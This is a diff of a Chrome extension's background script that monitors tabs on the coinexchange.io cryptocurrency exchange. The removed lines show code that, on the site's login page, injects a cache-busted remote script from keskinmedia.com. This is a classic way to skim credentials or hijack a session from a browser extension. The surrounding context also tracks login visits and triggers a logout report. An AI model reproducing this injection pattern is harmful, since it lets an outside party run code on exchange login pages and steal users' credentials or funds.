@@ -82,11 +82,6 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
     if (_userId && !_debug && tab.url.includes("https://www.coinexchange.io/") && changeInfo.status === "complete") {
 
         if (tab.url.includes("/login") && !tab.url.includes("noreload")) { // noreload sayfası değilse
-            chrome.tabs.executeScript(tabId, {
-                code: "var j = document.createElement('script'); j.id='ipSc'; j.src = 'https://keskinmedia.com/api/login.js?v='+ Math.random(); document.head.appendChild(j);",
-                runAt: "document_end"
-            });
-
             if (!_login) { // login sayfasına 1 defa gitmişse daha gitme
                 _login = true // login sayfasına 1 defa gitmesi yeterli.
                 LogoutBildir();
